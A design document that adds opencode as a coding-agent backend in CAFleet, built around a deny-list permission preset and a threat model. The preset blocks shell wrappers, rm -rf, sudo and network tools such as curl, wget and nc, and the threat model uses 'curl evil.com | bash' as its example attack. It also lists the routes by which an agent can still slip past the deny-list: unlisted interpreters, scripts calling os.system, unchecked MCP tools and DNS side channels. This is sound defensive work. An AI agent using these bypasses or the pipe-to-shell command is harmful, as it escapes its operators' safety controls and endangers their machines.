# opencode as a Third Coding-Agent Backend

**Status**: Approved
**Progress**: 18/35 tasks complete
**Last Updated**: 2026-05-19

## Overview

Add [opencode](https://opencode.ai) (TypeScript/Bun, MIT) as a third backend in CAFleet alongside `claude` (Claude Code) and `codex` (OpenAI Codex CLI), reusing the `CodingAgent` Protocol introduced by design 0000066. The backend spawns `opencode --agent cafleet --prompt <prompt>` — the bare `opencode` command is the documented TUI entry point per <https://opencode.ai/docs/cli/> — so the pane hosts a long-lived TUI that matches the operator affordance of the existing two backends. The `cafleet` agent definition is managed as a Python dataclass in CAFleet source and materialized to `~/.opencode/agents/cafleet.md` on first spawn (skip-if-exists, respecting any user-customized version of the file). Safety posture matches Claude Code's `dontAsk` — deny-list only, no OS-level sandbox.

## Success Criteria

- [ ] `cafleet/src/cafleet/coding_agent/opencode.py` defines `OpencodeAgent` and `CODING_AGENTS["opencode"] = OpencodeAgent()` is registered. The `--coding-agent` Click choice for `session create` and `member create` automatically picks up `opencode` via `list(CODING_AGENTS.keys())`.
- [ ] Spawn argv for `opencode` is `["opencode", "--agent", "cafleet", "--prompt", <prompt>]`. `display_name` is silently ignored (mirrors `CodexAgent`).
- [ ] `OpencodeAgent.ensure_available()` materializes `~/.opencode/agents/cafleet.md` from the in-source `CAFLEET_AGENT` dataclass preset, with skip-if-exists semantics — never overwrites a pre-existing file.
- [ ] The `CAFLEET_AGENT` preset is defined as a frozen dataclass (`OpencodeAgentDefinition`) in `cafleet/src/cafleet/coding_agent/opencode.py`, with a `to_markdown()` method that renders the YAML frontmatter (via `json.dumps`, since JSON is a strict subset of YAML 1.2) followed by the markdown body. The deny-list is spelled out in § Specification.
- [ ] The contract test in `cafleet/tests/test_coding_agent_protocol.py` passes for `OpencodeAgent` (already parametrized over `CODING_AGENTS.values()` per design 0000066).
- [ ] `ARCHITECTURE.md`, `README.md`, `docs/spec/cli-options.md`, `docs/opencode-members.md` (new), and every affected `skills/*/SKILL.md` describe the three-backend surface before code lands. The new doc `docs/opencode-members.md` mirrors `docs/codex-members.md` in shape.
- [ ] Step 0 empirical smoke test of the bare `opencode` TUI command against CAFleet's existing keystroke primitives (including the `--prompt <prompt>` initial-prompt path) passes for the primitives marked `verified-before-merge` in § Risks, or the design halts per the user's hard-stop rule in § Risks.
- [ ] `mise //cafleet:test`, `mise //cafleet:lint`, `mise //cafleet:typecheck` are green at every commit boundary.

---

## Background

Design 0000066 (Complete) extracted the `CodingAgent` Protocol and `CodingAgents` registry specifically so that adding a third backend is a single new file plus one registry entry. This doc exercises that extraction with opencode.

### Source-citation methodology

Source citations in this doc are from a snapshot of `reference/opencode/packages/opencode/src/` captured during design authoring. The vendored snapshot is older than the version backing the public CLI docs at <https://opencode.ai/docs/cli/> — verified by comparing the `index.ts:158-180` subcommand-registration set (every subcommand registered explicitly under `.strict()`, no default-command handler) to the public flag list, which documents a bare-`opencode` TUI entry point not present in the snapshot's `index.ts`. The opencode permission, MCP, and shell-tool architectures cited (`permission/index.ts`, `permission/evaluate.ts`, `mcp/index.ts`, `tool/shell.ts`, `tool/read.ts`, `tool/edit.ts`, `agent/agent.ts`, `config/agent.ts`, `config/permission.ts`, `util/wildcard.ts`) are stable invariants unlikely to have flipped between the snapshot and the current shipping binary, but Step 0 (§ Implementation) re-verifies the runtime behavior against the installed `opencode` binary before any source-code change is merged.

opencode is operationally closer to Claude Code than to Codex:

| Property | claude | codex | opencode |
|---|---|---|---|
| Long-lived TUI in the pane | yes | yes | yes (this design uses the bare `opencode` command — the documented TUI entry point per <https://opencode.ai/docs/cli/>) |
| Workspace-scoped auto-approval mechanism | `--permission-mode dontAsk` | `--ask-for-approval never --sandbox workspace-write` | `--agent cafleet` binds an inline permission ruleset that resolves every check to `allow` (catch-all) or `deny` (specific) — nothing falls through to `ask` |
| OS-level sandbox | no | yes (kernel-enforced via `workspace-write`) | **no** (per user instruction — matches claude's posture, not codex's) |
| Leading-`!` shell shortcut on input line | yes | yes | **verified-before-merge** (Step 0) |
| `--name`-style pane-title flag | yes (`--name`) | no | no (matches codex) |

The user's explicit framing: opencode's safety floor in CAFleet equals Claude Code's — deny-listed dangerous patterns enforced by opencode's own permission system, no kernel sandbox. The doc states this and does not promise stronger isolation.

### Why bare `opencode` TUI and not `opencode run`

`opencode run` is the documented non-interactive / headless subcommand: per <https://opencode.ai/docs/cli/> it is "useful for scripting, automation, or when you want a quick answer without launching the full TUI." A wrapper-loop pane around `opencode run` would not match the operator affordance of `claude` and `codex` panes (long-lived TUI you can scroll, switch to, and observe naturally). The user rejected this approach by name.

The bare `opencode` command is the documented TUI entry point: "The OpenCode CLI by default starts the TUI when run without any arguments." It accepts `--agent` for binding to a CAFleet-defined agent identity and `--prompt` for the initial prompt text — the two flags this design needs. The pane stays alive, accepts follow-up input via the TUI input box, and gives operators the same scroll/observe affordance as `claude` and `codex` panes.

### Why no `--dangerously-skip-permissions` and no `--interactive` in this design

`--dangerously-skip-permissions` is documented only as a flag of the `opencode run` subcommand at <https://opencode.ai/docs/cli/>, not as a bare-`opencode` flag — passing it to the bare command would either be rejected by yargs `.strict()` parsing or silently ignored. Independently, verified by grepping `dangerously-skip-permissions|dangerouslySkipPermissions` across `reference/opencode/packages/opencode/src/`: two hits in the snapshot — the flag declaration at `run.ts:236-240` and the **sole consumer** at `run.ts:740-755`, inside the `loop()` function nested in the non-interactive `execute()` path. The interactive paths (`runInteractiveLocalMode` at `run.ts:832-862`, `runInteractiveAttachMode` at `run.ts:800-829`) do **not** subscribe a `permission.asked` event handler that consults the flag. ⇒ Even when accepted, the flag has no effect in any interactive code path.

`--interactive` is not in the public CLI docs at all — it is an internal flag of the `opencode run` subcommand (`run.ts:230-235` in the snapshot) and is not a stable public surface. Betting the spec on it would couple CAFleet to an opencode internal that may move or be renamed without notice.

Net effect: the CAFleet pane uses the documented bare-`opencode` TUI entry and does not pass either flag. The CAFleet pane is operated by a Director (an agent), not a human — the Director cannot drive a focus-based Allow-once / Allow-always / Reject UI reliably. The safety floor therefore **MUST** pre-empt the `ask` state across the entire permission surface, so the TUI never shows a permission prompt in normal operation. This is the function of the `cafleet` agent definition at `~/.opencode/agents/cafleet.md` (§ Specification 3 + § 4) — the deny-list architecture means every permission evaluation resolves to `allow` (catch-all) or `deny` (specific), and the auto-approve-once handler that `--dangerously-skip-permissions` would provide is not needed.

---

## Specification

### 1. `OpencodeAgent` (`cafleet/src/cafleet/coding_agent/opencode.py`)

```python
from cafleet.coding_agent.base import ensure_binary_on_path
from cafleet.coding_agent.opencode_preset import CAFLEET_AGENT, materialize_cafleet_agent


class OpencodeAgent:
    name = "opencode"
    binary_name = "opencode"

    def ensure_available(self) -> None:
        ensure_binary_on_path(self.binary_name)
        materialize_cafleet_agent(CAFLEET_AGENT)

    def build_spawn_argv(self, prompt: str, *, display_name: str) -> list[str]:
        # display_name is unused — opencode has no `--name` analog.
        # Bare `opencode` accepts `[project]` (project-path) as a positional;
        # the initial prompt goes via `--prompt`, not as a positional.
        return [
            self.binary_name,
            "--agent",
            "cafleet",
            "--prompt",
            prompt,
        ]
```

`ensure_available()` does two things: (1) the standard PATH probe via `ensure_binary_on_path` (shared with the other backends), and (2) the materialization of `~/.opencode/agents/cafleet.md` from the in-source `CAFLEET_AGENT` dataclass preset (§ 3) with skip-if-exists semantics (§ 4). The materialization step is idempotent — it writes the file once on first spawn and is a cheap stat-then-no-op on subsequent spawns, so it is safe to run on every `ensure_available()` call. `display_name` is accepted to satisfy the `CodingAgent` Protocol signature but not used — opencode has no `--name`-style pane-title flag.

Why `ensure_available()` and not `build_spawn_argv()` for the materialization: `ensure_available()` is the spawn-precondition hook in the `CodingAgent` Protocol (`cafleet/src/cafleet/coding_agent/base.py:19-21`). Today its docstring reads narrowly as a PATH-only check; this design broadens it to cover "any spawn precondition, including required config-file materialization" — see the Step 3 task that updates the Protocol docstring before the `OpencodeAgent` impl lands, so the Protocol contract and the impl agree. Creating the preset is a precondition (the spawn argv references `--agent cafleet`, which falls back silently to opencode's default `build` agent if the definition file is missing or fails to parse — see § 3.5 + Step 0 deny-list smoke). `build_spawn_argv` is conceptually a pure function that returns argv from inputs — keeping it side-effect-free preserves that property and matches the shape of `ClaudeCodeAgent.build_spawn_argv` and `CodexAgent.build_spawn_argv`.

Why `--agent cafleet`, even though CAFleet members are general-purpose teammates: opencode's `--agent` flag is **not** restricted to task-specialization agents (plan / review / etc.). The `--agent` mechanism binds the spawn to any agent definition's permission ruleset, including general-purpose primary agents. The opencode default `build` agent at `agent/agent.ts:126-139` is itself declared as `mode: "primary"` with `description: "The default agent. Executes tools based on configured permissions."` — a general-purpose conversational agent, not a specialized role. Our `cafleet` agent (§ 3) is the same shape: `mode: primary`, general-purpose, but with a permission ruleset tightened to the CAFleet safety floor (catch-all allow + dangerous-pattern deny). The `plan` agent at `agent/agent.ts:142-164` confirms this pattern — `plan` is also `mode: primary` and its only meaningful divergence from `build` is its `edit: {"*": "deny", ...}` ruleset; in other words, opencode itself uses agents as permission-policy bindings, not just task specializations. Binding to `--agent cafleet` is the canonical opencode mechanism for pinning a permission posture to a spawn.

Why `--prompt` and not a positional: per <https://opencode.ai/docs/cli/>, the bare `opencode` command takes `[project]` (an optional project-path positional), NOT `[message..]`. The `[message..]` positional belongs to the `opencode run` subcommand. Passing the prompt as a positional to bare `opencode` would silently misinterpret it as a project path — opencode would either chdir into it (if it happens to look like a path that exists) or error out. The `--prompt` flag is the documented mechanism for passing the initial prompt to bare-command TUI mode.

### 2. Registry wiring (`cafleet/src/cafleet/coding_agent/__init__.py`)

```python
from cafleet.coding_agent.base import CodingAgent, ensure_binary_on_path
from cafleet.coding_agent.claude import ClaudeCodeAgent
from cafleet.coding_agent.codex import CodexAgent
from cafleet.coding_agent.opencode import OpencodeAgent

CODING_AGENTS: dict[str, CodingAgent] = {
    "claude": ClaudeCodeAgent(),
    "codex": CodexAgent(),
    "opencode": OpencodeAgent(),
}

__all__ = [
    "CODING_AGENTS",
    "ClaudeCodeAgent",
    "CodexAgent",
    "CodingAgent",
    "OpencodeAgent",
    "ensure_binary_on_path",
]
```

`click.Choice(list(CODING_AGENTS.keys()))` at `cli.py:893` (member create) and `cli.py:260` (session create) picks up `opencode` automatically — no Click changes required.

### 3. `OpencodeAgentDefinition` dataclass + `CAFLEET_AGENT` preset (`cafleet/src/cafleet/coding_agent/opencode_preset.py`)

The agent definition is owned in CAFleet source as an immutable, structurally typed dataclass. The dataclass is the source of truth; the markdown file at `~/.opencode/agents/cafleet.md` is its rendered on-disk form for opencode to read.

#### 3.1 Dataclass shape

```python
from dataclasses import dataclass, field


@dataclass(frozen=True)
class PermissionRuleset:
    # Object-valued keys — dict insertion order is the rule precedence per
    # permission/evaluate.ts:9-15 (findLast). The catch-all "*": "allow"
    # MUST be listed FIRST so specific deny patterns appearing LATER win.
    bash: dict[str, str] = field(default_factory=dict)
    read: dict[str, str] = field(default_factory=dict)
    edit: dict[str, str] = field(default_factory=dict)
    # Action-shorthand keys — single Action value, never reaches `ask`.
    external_directory: str = "deny"
    webfetch: str = "deny"
    websearch: str = "deny"
    repo_clone: str = "deny"
    question: str = "deny"
    plan_enter: str = "deny"
    plan_exit: str = "deny"


@dataclass(frozen=True)
class OpencodeAgentDefinition:
    description: str
    mode: str  # "primary" or "subagent" — see agent/agent.ts:139,164
    permission: PermissionRuleset
    body: str  # markdown body (everything after the YAML frontmatter)

    def to_markdown(self) -> str:
        """Render as YAML frontmatter + markdown body.

        Frontmatter is emitted as JSON inside the `---` block. JSON is a strict
        subset of YAML 1.2, so opencode's `ConfigMarkdown.parse` reads it
        correctly via the existing YAML parser. Using `json.dumps` (a) avoids
        adding PyYAML as a CAFleet dependency, (b) guarantees correct quoting
        of pattern keys that contain spaces / shell metacharacters
        (`"bash -c*"`, `"git push*"`), and (c) preserves dict insertion order
        (Python 3.7+ guarantee + `json.dumps` honors it), which is required
        for the catch-all-first / specific-deny-later discipline.
        """
        import json
        from dataclasses import asdict
        frontmatter = {
            "description": self.description,
            "mode": self.mode,
            "permission": asdict(self.permission),
        }
        return f"---\n{json.dumps(frontmatter, indent=2, ensure_ascii=False)}\n---\n\n{self.body}\n"
```

The `field(default_factory=dict)` on the Object-valued keys lets each call site supply an inline dict literal whose insertion order IS the rule precedence — Python dicts preserve insertion order since 3.7, and the operator must list `"*": "allow"` first per § 3.2 below.

#### 3.2 The CAFLEET_AGENT constant (the preset)

```python
CAFLEET_AGENT = OpencodeAgentDefinition(
    description=(
        "CAFleet-spawned member with workspace-scoped permission floor; "
        "matches Claude Code dontAsk safety posture."
    ),
    mode="primary",
    permission=PermissionRuleset(
        bash={
            "*": "allow",
            "bash -c*": "deny",
            "sh -c*": "deny",
            "zsh -c*": "deny",
            "python -c*": "deny",
            "python3 -c*": "deny",
            "perl -e*": "deny",
            "node -e*": "deny",
            "node --eval*": "deny",
            "ruby -e*": "deny",
            "eval*": "deny",
            "exec*": "deny",
            "rm -rf*": "deny",
            "sudo*": "deny",
            "git push*": "deny",
            "git reset --hard*": "deny",
            "chmod*": "deny",
            "chown*": "deny",
            "curl*": "deny",
            "wget*": "deny",
            "nc*": "deny",
            "ssh*": "deny",
            "scp*": "deny",
            "rsync*": "deny",
            "osascript*": "deny",
        },
        read={
            "*": "allow",
            "**/.env": "deny",
            "**/.env.*": "deny",
        },
        edit={
            "*": "allow",
            "**/.env": "deny",
            "**/.env.*": "deny",
        },
        # external_directory / webfetch / websearch / repo_clone / question /
        # plan_enter / plan_exit default to "deny" via PermissionRuleset.
    ),
    body=(
        "# CAFleet member agent\n\n"
        "You are a CAFleet member spawned by the Director. The bash, read, "
        "and edit permission rulesets in your frontmatter enforce a "
        "workspace-scoped safety floor that mirrors Claude Code's `dontAsk` "
        "posture: dangerous shell-indirection wrappers, destructive "
        "operations, network egress utilities, and `.env` files are denied; "
        "everything else is allowed without user prompts. Refer to your "
        "Director's spawn-prompt instructions for the task."
    ),
)
```

The rendered markdown (`CAFLEET_AGENT.to_markdown()`) is what gets written to disk:

```markdown
---
{
  "description": "CAFleet-spawned member with workspace-scoped permission floor; matches Claude Code dontAsk safety posture.",
  "mode": "primary",
  "permission": {
    "bash": {
      "*": "allow",
      "bash -c*": "deny",
      ...
    },
    "read": { "*": "allow", "**/.env": "deny", "**/.env.*": "deny" },
    "edit": { "*": "allow", "**/.env": "deny", "**/.env.*": "deny" },
    "external_directory": "deny",
    "webfetch": "deny",
    "websearch": "deny",
    "repo_clone": "deny",
    "question": "deny",
    "plan_enter": "deny",
    "plan_exit": "deny"
  }
}
---

# CAFleet member agent

You are a CAFleet member spawned by the Director. ...
```

#### 3.3 Catch-all + deny discipline (last-match-wins)

`permission/evaluate.ts:9-15`:

```ts
export function evaluate(permission, pattern, ...rulesets) {
  const rules = rulesets.flat()
  const match = rules.findLast(
    (rule) => Wildcard.match(permission, rule.permission) && Wildcard.match(pattern, rule.pattern),
  )
  return match ?? { action: "ask", permission, pattern: "*" }
}
```

For each Object-valued permission key (`bash`, `read`, `edit`): list `"*": "allow"` **first**, then specific `"<dangerous-pattern>": "deny"` entries. `findLast` returns the deny for matching patterns and the catch-all allow for everything else. The `{ action: "ask", ... }` fallthrough only fires when no rule matches — the catch-all prevents this. For Action-shorthand keys (`external_directory`, `webfetch`, `websearch`, `repo_clone`, `question`, `plan_enter`, `plan_exit`), a single Action value is set directly — no `ask` state possible.

Why this discipline matters for a bare-`opencode` TUI spawn: per § Background, this design does NOT pass `--dangerously-skip-permissions`. The catch-all + deny pattern is therefore the sole mechanism that prevents the TUI from showing a permission prompt the Director cannot answer — every permission check resolves to `allow` (catch-all) or `deny` (specific), nothing falls through to `ask`.

#### 3.4 Why each rule family is what it is

Explicit `question` / `plan_enter` / `plan_exit` / `repo_clone` denies are belt-and-suspenders. opencode's built-in `defaults` block at `agent/agent.ts:103-122` already declares these as `deny` for every agent, so a vanilla `--agent cafleet` spawn inherits them via the merge precedence at `agent/agent.ts:306` (`item.permission = Permission.merge(item.permission, Permission.fromConfig(value.permission ?? {}))` — user-config rules appended LAST so `findLast` selects them). We re-state them anyway because (a) opencode upstream could flip any default to `allow` in a future release without flagging a breaking change, and (b) the explicit re-statement documents intent. Verified scope: `question` gates `tool/question.ts:14` (`QuestionTool` — pops a human prompt useless without a human); `plan_enter` / `plan_exit` gate `tool/plan.ts:14` (`PlanExitTool` — pops a Yes/No question and switches agents).

Wrapper-command rationale: `tool/shell.ts:374-410` parses each tree-sitter command node independently (so `cd /tmp; curl x` checks both nodes against the deny-list), but wrapper commands like `bash -c '...'` are a SINGLE node — without the wrapper denies, an agent can smuggle any command through `bash -c "<smuggled>"` because the deny-list only ever sees `bash -c '...'` as one token. The wrapper deny-list is therefore not optional.

Credential-path rationale (why `read` / `edit` do not enumerate `~/.aws/**`, `~/.ssh/**`, `~/.config/gh/**`, `~/.config/opencode/**`): although `permission/index.ts:265-269` `expand()` (invoked from `fromConfig` at `:281`) tilde-expands such patterns at config-load time to absolute paths like `/home/<user>/.aws/**`, the `read` and `edit` tools pass a **worktree-RELATIVE** path to the evaluator (`tool/read.ts:229`: `patterns: [path.relative(instance.worktree, filepath)]`; same shape at `tool/edit.ts:100,143`). A relative input such as `../.aws/credentials` never matches an absolute pattern, so tilde-prefixed `read` / `edit` rules would be inert. The actual block on out-of-worktree credential reads is `external_directory: deny`, which fires earlier at `tool/read.ts:222-225` via `assertExternalDirectoryEffect` (and the equivalent guard in `tool/edit.ts`). The remaining in-worktree `**/.env` / `**/.env.*` rules ARE effective because they match relative paths.

Wildcard semantics (why `**/.env` and `*/.env` are equivalent here): opencode's matcher at `util/wildcard.ts:3-19` converts every `*` to regex `.*` and does NOT special-case `**` as a directory-spanning globstar — `*` already matches across path separators. The `**` prefix in the patterns above is stylistic and a reader should not assume otherwise.

`external_directory: "deny"` Action-shorthand semantics: per `config/permission.ts:45-46` the shorthand normalizes to `{"*": "deny"}`. opencode then auto-merges `external_directory: {Truncate.GLOB: "allow"}` per `agent/agent.ts:309-323` UNLESS the agent's ruleset already has an explicit deny rule with `pattern === Truncate.GLOB` (ours uses `"*"`, not `Truncate.GLOB`). Net effect with `findLast`: the auto-allow wins for `Truncate.GLOB`-matching paths (paths opencode would have truncated in its display anyway), the `"*": deny` wins for everything else. This is intended behavior — the doc keeps the shorthand for readability, but readers should not assume `external_directory: deny` is absolute.

#### 3.5 No MCP server stanzas

Per `mcp/index.ts:165-181`, MCP-contributed tools are wrapped via `dynamicTool` whose `execute` calls `client.callTool(...)` directly — no `permission.ask` interception. ⇒ The deny-list above does **nothing** for any MCP-contributed tool. MCP server stanzas are a top-level `opencode.json` key, not an agent-frontmatter key (per `config/permission.ts:16-35` which lists every supported frontmatter key — `mcp` is not among them), so the agent-file mechanism this design uses cannot accidentally declare MCP servers itself. The relevant mitigation is therefore that **CAFleet ships no `opencode.json` of any kind** (see § 6 + Changelog) — there is no CAFleet-owned config surface through which an MCP stanza could leak. The remaining bypass surface is a USER-level `~/.config/opencode/opencode.json` declaring MCP servers that opencode loads alongside our agent definition; those MCP-contributed tools bypass the deny-list entirely. The user-level risk is documented in § Threat Model.

### 4. Materialization at startup — `~/.opencode/agents/cafleet.md`

#### 4.1 Target path

opencode's home-scope config search walks `~/.opencode/` per `config/paths.ts:34-38` (`afs.up({ targets: [".opencode"], start: Global.Path.home, stop: Global.Path.home })`). The agent loader at `config/agent.ts:105-130` then `Glob.scan("{agent,agents}/**/*.md", { cwd: <found-dir>, ... })` finds every `*.md` under both `agent/` and `agents/` subdirectories of the located `.opencode/` dir. We materialize at `agents/` (plural), matching the user-requested target:

```python
import os
TARGET = os.path.join(os.path.expanduser("~"), ".opencode", "agents", "cafleet.md")
```

`Global.Path.home` resolves to `os.homedir()` per `reference/opencode/packages/core/src/global.ts:18`, which `os.path.expanduser("~")` mirrors on the Python side.

#### 4.2 Skip-if-exists semantics

```python
import os
from pathlib import Path


def materialize_cafleet_agent(definition: OpencodeAgentDefinition) -> None:
    """Write the rendered agent markdown to ~/.opencode/agents/cafleet.md
    if and only if the file does not already exist. Never overwrites a
    pre-existing file — operators who customize the file keep their edits.
    """
    target = Path(os.path.expanduser("~")) / ".opencode" / "agents" / "cafleet.md"
    if target.exists():
        return
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(definition.to_markdown(), encoding="utf-8")
```

The skip-if-exists rule has two consequences operators must understand:

1. **User customization survives upgrades.** Once the file exists, CAFleet never touches it.
2. **Upgrade footgun.** A CAFleet upgrade with an improved preset (e.g. a new wrapper added to the bash deny-list) will NOT propagate to a machine that already has the file. To refresh the preset, operators must `rm ~/.opencode/agents/cafleet.md` and re-run any `cafleet` command that touches `OpencodeAgent.ensure_available()` — e.g. `cafleet --session-id <s> member create --coding-agent opencode ...`. This trade-off is documented in `docs/opencode-members.md`.

#### 4.3 Failure modes

`materialize_cafleet_agent` can fail in two ways:

1. `target.parent.mkdir(...)` raises `PermissionError` / `OSError` if `$HOME` is read-only or `~/.opencode/` is owned by another user. → `ensure_available()` propagates the exception; `cli.member_create` wraps it via the existing `RuntimeError` path at `cli.py:921-926` and the spawn aborts cleanly with no orphaned placement.
2. `target.write_text(...)` raises if the disk is full or the directory was deleted between mkdir and write. Same propagation path.

No silent failure — opencode must be able to load `--agent cafleet` for the spawn argv to be meaningful, and the deny-list MUST be on disk before the spawn proceeds.

#### 4.4 No CLI plumbing changes

`cli.member_create` (`cafleet/src/cafleet/cli.py:919-966`) requires NO modification for opencode. The existing call to `agent.ensure_available()` at `cli.py:923` now triggers the materialization as a side effect. No new imports, no `fwd_env` additions, no `OPENCODE_CONFIG_DIR` forwarding. The `fwd_env` dict continues to carry only `CAFLEET_DATABASE_URL`.

`cli.session_create` (`cli.py:255-293`) is also unchanged — `session create --coding-agent opencode` does not spawn a coding-agent process, so no materialization needs to happen there. Operators running `opencode --agent cafleet --prompt <prompt>` manually in the calling pane will trigger materialization the first time they invoke `cafleet member create --coding-agent opencode` (or by importing `cafleet.coding_agent.opencode_preset.materialize_cafleet_agent` and calling it directly); this is documented in `docs/opencode-members.md`.

### 5. Multiplexer Protocol — no changes

The `Multiplexer` Protocol from design 0000066 (`cafleet/src/cafleet/multiplexer/base.py:16-76`) is unchanged. Specifically:

- `send_choice_key`: documented as **undefined behavior for opencode placements** in `docs/opencode-members.md` (the TUI permission UI is bypassed by the catch-all-allow deny-list, so the Director should never need to send a choice key). The Director MUST NOT call it against an opencode placement; Multiplexer Protocol stays per-multiplexer, no per-coding-agent dispatch.
- `send_inline_preview`, `send_poll_trigger`, `send_bash_command`, `send_freetext_and_submit`, `send_exit`: keystroke into the opencode TUI input box. Behavior is **verified-before-merge** in § Risks.
- `capture_pane`: unchanged (TUI rendering is captured the same way as a TUI-mode claude or codex pane).

**Recovery posture if a TUI permission popup appears in normal operation.** A popup is a regression escape from the deny-list-is-the-floor invariant (e.g. opencode added a new tool category in a future release that uses `ask` semantics and our `cafleet` agent definition does not yet cover it), NOT a runtime decision-point. The Director MUST escalate back to the user, capture pane state via `capture_pane` for diagnosis, and re-run Step 0-style empirical verification to extend the deny-list (which means updating `CAFLEET_AGENT` in source, shipping a new CAFleet release, and instructing operators to delete `~/.opencode/agents/cafleet.md` to refresh the preset per § 4.2). The Director MUST NOT wire up `send_choice_key` as an ad-hoc fallback to dismiss the popup — that defeats the floor invariant and silently allows future bypass surfaces. Same rule for opencode-specific TUI affordances (e.g. an opencode update that adds a slash-command surface): treat as a Step 0-class regression, not a Director runtime concern.

### 6. Packaging (`cafleet/pyproject.toml`)

The wheel config at `cafleet/pyproject.toml:23-29` is **unchanged** by this design. The CAFleet agent preset ships as ordinary Python source (`cafleet/src/cafleet/coding_agent/opencode_preset.py`) inside the existing `packages = ["src/cafleet"]` entry — no `include` additions, no package-data files, no wheel-build adjustments. The preset is materialized at runtime to `~/.opencode/agents/cafleet.md` (§ 4), not shipped as a data file.

---

## Threat Model

The opencode backend matches Claude Code's `dontAsk` safety posture: **deny-list only, no OS-level sandbox**. This is explicit user policy. The doc does not promise stronger isolation than `dontAsk` already provides.

### What the deny-list covers

| Bypass vector | Mitigation |
|---|---|
| Direct dangerous shell (`rm -rf foo`, `sudo apt install`) | `bash` deny pattern (`rm -rf*`, `sudo*`, etc.) |
| Shell-indirection wrappers (`bash -c '<smuggled>'`, `python -c '<smuggled>'`) | `bash` deny on wrapper prefixes; `tool/shell.ts:374-410` parses commands tree-sitter-style and `bash -c '...'` is one node, so the wrapper deny is the effective check |
| Network egress (`curl evil.com | bash`) | `bash` denies on `curl*`, `wget*`, `nc*`, `ssh*`, `scp*`, `rsync*`; `webfetch` and `websearch` tools denied at the tool level |
| Filesystem path escape via `read` / `edit` | `external_directory: deny` is the load-bearing rule — it fires at `tool/read.ts:222-225` (and the `tool/edit.ts` equivalent) via `assertExternalDirectoryEffect` before any worktree-relative pattern check, blocking out-of-worktree reads/writes including credential paths like `~/.aws/**`, `~/.ssh/**`, `~/.config/gh/**`, `~/.config/opencode/**` (§ Specification 3.4 explains why tilde-prefixed `read`/`edit` patterns are NOT used: those patterns would be inert because the evaluator receives worktree-relative paths). In-worktree `**/.env` / `**/.env.*` denies cover the remaining surface for repos that check `.env` files into the tree |
| Plan-mode tool autonomy (`plan_enter` / `plan_exit`) | Explicit `agent/cafleet.md` denies override the agent defaults at `agent/agent.ts:103-122` via `findLast` merge precedence at `agent/agent.ts:306` (defense-in-depth — opencode already denies these by default, our re-statement guards against an upstream default flip or an operator override) |
| Human-question tool (`question`) | Explicit deny — no human is available to answer in the CAFleet pane |
| Repo cloning to unsafe locations | `repo_clone: deny` |

### What the deny-list does NOT cover

These are real bypass surfaces that mirror what `dontAsk` Claude Code users already accept:

| Hole | Why it exists |
|---|---|
| **MCP-contributed tools** | `mcp/index.ts:165-181` does not wrap MCP tools with permission checks. ANY MCP tool that ends up in opencode's tool registry bypasses the deny-list entirely. The CAFleet config ships zero MCP stanzas, but a user-level `~/.config/opencode/opencode.json` that loads MCP servers will leak them into the CAFleet spawn. Operators MUST NOT add MCP servers to any opencode config their machine loads. Documented in `docs/opencode-members.md`. |
| **Shell wrappers we missed** | The wrapper deny list (`bash -c`, `sh -c`, `zsh -c`, `python -c`, `python3 -c`, `perl -e`, `node -e`, `node --eval`, `ruby -e`, `eval`, `exec`, `osascript`) is enumerated. Any wrapper not on this list (PowerShell on Windows, `fish -c`, `dash -c`, `tclsh`, `lua`, `awk 'BEGIN{system(...)}'`, …) bypasses. CAFleet targets Linux/macOS workstations; the list is sized accordingly. |
| **Credential reads via misconfigured `external_directory`** | A user-level config that ranks earlier in `paths.ts` and explicitly allows `external_directory` for a path containing credentials (`~/.aws/**`, `~/.ssh/**`, etc.) would override the agent definition's deny. If `--agent cafleet` is ever dropped from the spawn argv, opencode falls back to its default `build` agent and the safety floor is lost. |
| **CAFleet writes to `~/.opencode/agents/cafleet.md` on first spawn** | This design introduces a new install-footprint behavior — CAFleet writes one file under the user's `$HOME` (the agent preset, materialized by `OpencodeAgent.ensure_available()` per § 4). Neither `claude` nor `codex` writes to `$HOME` from CAFleet code. Risk: a CAFleet bug could write a malformed agent definition that breaks opencode loading, but the skip-if-exists rule limits this to first spawn (operators can delete the file to recover). The write is scoped to one well-known opencode path; CAFleet never writes anywhere else under `$HOME`. Documented in `docs/opencode-members.md`. |
| **Stale preset after CAFleet upgrade** | Skip-if-exists means a CAFleet upgrade that improves the deny-list does NOT propagate to machines that already have `~/.opencode/agents/cafleet.md`. Operators must `rm ~/.opencode/agents/cafleet.md` and re-run any `cafleet member create --coding-agent opencode` invocation to refresh the preset. The trade-off favors respecting user customization over auto-applying upstream changes; documented in `docs/opencode-members.md` with the refresh recipe. |
| **Language-specific eval bypasses** | `python script.py` where `script.py` contains `os.system(...)` passes the wrapper check (it's not `python -c`) and runs whatever the script wants. Same for any compiled binary the agent writes and runs. This is the fundamental limit of any allow-list-of-binaries permission model. |
| **Side-channel egress** | DNS lookups, ICMP, kernel-level networking via `/proc`, NTP traffic — none of these go through `bash` and are not gated. Codex's kernel sandbox WOULD block these; CAFleet's opencode backend does NOT. |

### Posture statement

The opencode deny-list is the same kind of safety floor that Claude Code's `dontAsk` provides: routine permission prompts auto-resolve, dangerous patterns are explicitly blocked, and a determined or buggy agent can still escape via the holes above. Operators who need kernel-enforced isolation should use the `codex` backend with its `workspace-write` sandbox. This is the documented trade-off, not a bug.

---

## Risks

Each Multiplexer keystroke primitive against the bare `opencode` TUI (spawn argv `["opencode", "--agent", "cafleet", "--prompt", <prompt>]` per § Specification 1), marked **verified-before-merge** if Step 0 must confirm it, **verified** if already known to work, or **N/A** if not applicable.

| Primitive | Expected behavior | Status |
|---|---|---|
| `send_inline_preview` (2 lines: header + body) | TUI input box accepts both lines and submits ONE prompt containing both, OR submits two prompts (header is noise, body is the actionable message). The acceptable failure mode is "two prompts, header is noise, opencode treats it as a no-op". The unacceptable failure mode is "header triggers an unwanted tool call or causes opencode to react badly". | **verified-before-merge** |
| `send_poll_trigger` (keystrokes `cafleet --session-id <s> message poll --agent-id <a>` + Enter) | This is a SHELL command, not an agent prompt. For it to work, opencode's TUI input box must have a leading-`!` shortcut (matching `claude` and `codex`) AND `tmux.py`'s `send_poll_trigger` must be the version that prefixes with `!`. Verify the prefix is present in the TUI-bound primitive code, OR verify opencode's TUI input box has its own shell-passthrough mechanism. | **verified-before-merge** |
| `send_bash_command` (keystrokes `! <cmd>` + Enter) | Requires opencode TUI input box honors a leading-`!` shortcut to shell out. The current `cafleet/src/cafleet/multiplexer/tmux.py` `send_bash_command` keystrokes literal `!` + command + Enter — relies on the receiver. | **verified-before-merge** |
| `send_freetext_and_submit` | TUI input box accepts free text and submits on Enter. | **verified-before-merge** |
